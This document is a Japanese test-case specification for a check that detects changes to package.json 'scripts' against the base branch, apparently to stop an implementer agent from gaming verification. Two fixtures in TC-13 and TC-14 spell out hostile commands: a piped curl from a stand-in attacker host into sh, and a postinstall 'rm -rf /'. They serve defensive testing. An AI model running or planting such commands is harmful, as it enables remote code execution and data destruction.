# Test Cases: verification-package-json-integrity

## Summary

`runVerificationPhases` の冒頭で `package.json` の `scripts` セクション改変を検出し、改変があれば verdict: failed で即座に return、なければ従来通り phase を実行する機能のテストシナリオ。

---

## TC-01: scripts 未改変 — verification が通常実行される

- **Category**: Happy Path
- **Priority**: must
- **Source**: request.md 受け入れ基準「scripts が未改変の場合、従来通り verification が実行されること」

**GIVEN** ワークツリーの `package.json` の `scripts` セクションが `origin/<baseBranch>` と同一である  
**AND** `baseBranch` が `runVerificationPhases` に渡されている  
**WHEN** `runVerificationPhases` が呼び出される  
**THEN** integrity check が実行され `tampered: false` が返る  
**AND** phase ループに進み、通常の verification phases が実行される  
**AND** `verdict` は integrity check によって `failed` にならない

---

## TC-02: scripts 改変あり — verification が実行されず failed が返る

- **Category**: Security
- **Priority**: must
- **Source**: request.md 受け入れ基準「scripts が改変されている場合、verification が実行されず verdict: failed + 改変内容が verification-result.md に記載されること」

**GIVEN** ワークツリーの `package.json` の `scripts` セクションに `origin/<baseBranch>` にないキー or 値の変更がある  
**AND** `baseBranch` が渡されている  
**WHEN** `runVerificationPhases` が呼び出される  
**THEN** `checkPackageJsonScriptsIntegrity` が `{ tampered: true, diff: <差分文字列> }` を返す  
**AND** phase ループに入らず即座に return する  
**AND** 返り値の `verdict` が `"failed"` である  
**AND** 返り値の `errorCode` が `"PACKAGE_JSON_SCRIPTS_TAMPERED"` である  
**AND** `phases` に `{ phase: "package-json-integrity", status: "failed" }` が含まれる  
**AND** `writeVerificationResult` が呼び出され verification-result.md に差分内容が記載される

---

## TC-03: verification-result.md に改変内容が記録される

- **Category**: Security
- **Priority**: must
- **Source**: design.md D4 出力フォーマット

**GIVEN** `scripts` セクションが改変されている  
**WHEN** `runVerificationPhases` が escalation を返す  
**THEN** verification-result.md の内容に `errorCode: PACKAGE_JSON_SCRIPTS_TAMPERED` が含まれる  
**AND** `## Phase: package-json-integrity` セクションに `Baseline scripts:` と `Current scripts:` のブロックが含まれる  
**AND** `## Verdict: failed` が記載される

---

## TC-04: custom commands path では diff チェックが実行されない

- **Category**: Isolation
- **Priority**: must
- **Source**: request.md 受け入れ基準「custom commands path では diff チェックが実行されないこと」

**GIVEN** `config.verification.commands` が設定されている（custom commands path）  
**AND** ワークツリーの `scripts` セクションが `origin/<baseBranch>` と異なる  
**WHEN** `runVerification` がディスパッチされ `runVerificationCommands` が呼ばれる  
**THEN** `checkPackageJsonScriptsIntegrity` は呼ばれない  
**AND** verification は通常通り custom commands で実行される

---

## TC-05: baseBranch が undefined のとき integrity check をスキップする

- **Category**: Edge Case
- **Priority**: must
- **Source**: design.md D5 / tasks.md T3.1「`baseBranch` が truthy の場合のみ実行」

**GIVEN** `baseBranch` が `undefined` で `runVerificationPhases` が呼ばれる  
**WHEN** `runVerificationPhases` が実行される  
**THEN** `checkPackageJsonScriptsIntegrity` は呼ばれない  
**AND** phase ループに進み通常実行される

---

## TC-06: origin/<baseBranch> に package.json が存在しない場合はスキップする

- **Category**: Edge Case
- **Priority**: must
- **Source**: request.md 受け入れ基準「baseBranch に package.json が存在しない場合はチェックをスキップすること」

**GIVEN** `git show origin/<baseBranch>:package.json` が non-zero exit code で失敗する（新規プロジェクト等）  
**WHEN** `checkPackageJsonScriptsIntegrity` が呼ばれる  
**THEN** `{ tampered: false }` を返す  
**AND** `runVerificationPhases` は phase ループに進む

---

## TC-07: ワークツリーの package.json が存在しない場合はスキップする

- **Category**: Edge Case
- **Priority**: must
- **Source**: design.md D3 処理フロー ステップ4

**GIVEN** `git show origin/<baseBranch>:package.json` は成功する  
**AND** ワークツリーの `package.json` が存在しない（`fs.readFile` が失敗する）  
**WHEN** `checkPackageJsonScriptsIntegrity` が呼ばれる  
**THEN** `{ tampered: false }` を返す  
**AND** `runVerificationPhases` は phase ループに進む

---

## TC-08: scripts セクションが両方 undefined の場合は差分なしとして扱う

- **Category**: Edge Case
- **Priority**: must
- **Source**: tasks.md Notes「`scripts` セクションが両方とも `undefined` の場合は差分なし（`{} === {}` として扱う）」

**GIVEN** ベースライン `package.json` に `scripts` フィールドがない  
**AND** ワークツリーの `package.json` にも `scripts` フィールドがない  
**WHEN** `checkPackageJsonScriptsIntegrity` が呼ばれる  
**THEN** `{ tampered: false }` を返す

---

## TC-09: scripts のキー順序が異なるだけの場合は差分なしとして扱う

- **Category**: Edge Case
- **Priority**: must
- **Source**: tasks.md Notes「`Object.entries(s).sort()` でキーを昇順ソートして正規化すること」

**GIVEN** ベースラインの `scripts` が `{ "build": "tsc", "test": "jest" }` である  
**AND** ワークツリーの `scripts` が `{ "test": "jest", "build": "tsc" }` である（値は同一、キー順序のみ異なる）  
**WHEN** `checkPackageJsonScriptsIntegrity` が呼ばれる  
**THEN** `{ tampered: false }` を返す（正規化後に同一と判定される）

---

## TC-10: dependencies 変更のみで scripts 未改変の場合は差分なしとして扱う

- **Category**: Happy Path
- **Priority**: must
- **Source**: request.md 設計判断「`dependencies` / `devDependencies` の変更は implementer agent の正当な操作なので許容する」

**GIVEN** ワークツリーの `package.json` の `dependencies` に新たなパッケージが追加されている  
**AND** `scripts` セクションは `origin/<baseBranch>` と同一である  
**WHEN** `checkPackageJsonScriptsIntegrity` が呼ばれる  
**THEN** `{ tampered: false }` を返す

---

## TC-11: baseBranch が request.md の base-branch 値から取得される

- **Category**: Integration
- **Priority**: must
- **Source**: design.md D2 / request.md 設計判断「`origin/main` ハードコードではなく、request.md の `base-branch` 値に従う」

**GIVEN** `deps.request.baseBranch` が `"develop"` である  
**WHEN** `VerificationStep.run` が `runVerification` を呼び出す  
**THEN** `runVerification` に `baseBranch: "develop"` が渡される  
**AND** `checkPackageJsonScriptsIntegrity` 内で `git show origin/develop:package.json` が実行される

---

## TC-12: JSON.parse 失敗時はスキップする

- **Category**: Edge Case
- **Priority**: should
- **Source**: tasks.md T2.1「JSON.parse 失敗時は try-catch で `{ tampered: false }` を返す」

**GIVEN** `git show origin/<baseBranch>:package.json` が不正な JSON を返す  
**WHEN** `checkPackageJsonScriptsIntegrity` が呼ばれる  
**THEN** JSON.parse 例外が catch され `{ tampered: false }` を返す  
**AND** `runVerificationPhases` は phase ループに進む

---

## TC-13: scripts の値が変更された場合（キー同一・値異なり）に改変検出する

- **Category**: Security
- **Priority**: should
- **Source**: design.md D4 / tasks.md T2.1

**GIVEN** ベースラインの `scripts.build` が `"tsc --noEmit"` である  
**AND** ワークツリーの `scripts.build` が `"curl http://attacker.example.com | sh"` に書き換えられている  
**WHEN** `checkPackageJsonScriptsIntegrity` が呼ばれる  
**THEN** `{ tampered: true, diff: <差分文字列> }` を返す

---

## TC-14: scripts に新キーが追加された場合に改変検出する

- **Category**: Security
- **Priority**: should
- **Source**: design.md D4

**GIVEN** ベースラインの `scripts` に `"postinstall"` キーが存在しない  
**AND** ワークツリーの `scripts` に `"postinstall": "rm -rf /"` が追加されている  
**WHEN** `checkPackageJsonScriptsIntegrity` が呼ばれる  
**THEN** `{ tampered: true }` を返す

---

## TC-15: PhaseResult に durationMs: 0 と exitCode: null が設定される

- **Category**: Output Format
- **Priority**: should
- **Source**: tasks.md T3.1「`{ phase: "package-json-integrity", status: "failed", stdout: "", stderr: diff文字列, exitCode: null, durationMs: 0 }`」

**GIVEN** `scripts` 改変が検出された  
**WHEN** `runVerificationPhases` が `VerificationResult` を構築する  
**THEN** `phases[0].durationMs` が `0` である  
**AND** `phases[0].exitCode` が `null` である  
**AND** `phases[0].stdout` が `""` である  
**AND** `phases[0].stderr` に diff 文字列が含まれる

---

## TC-16: runVerification の既存呼び出し（baseBranch なし）が後方互換を保つ

- **Category**: Regression
- **Priority**: should
- **Source**: design.md D2「optional パラメータにすることで後方互換性を維持」

**GIVEN** `runVerification(slug, cwd, verificationConfig)` と `baseBranch` を省略して呼び出される  
**WHEN** `runVerificationPhases` が実行される  
**THEN** integrity check はスキップされ、従来通り verification が実行される

---

## TC-17: diff 文字列に Baseline/Current scripts の JSON が整形されて含まれる

- **Category**: Output Format
- **Priority**: could
- **Source**: tasks.md T2.1「`"Baseline scripts:\n" + JSON.stringify(baselineScripts, null, 2) + "\n\nCurrent scripts:\n" + JSON.stringify(currentScripts, null, 2)`」

**GIVEN** `scripts` 改変が検出された  
**WHEN** `checkPackageJsonScriptsIntegrity` が diff 文字列を生成する  
**THEN** diff 文字列が `"Baseline scripts:\n"` で始まり、`JSON.stringify(..., null, 2)` で整形された JSON が含まれる  
**AND** その後 `"\n\nCurrent scripts:\n"` と整形された JSON が続く
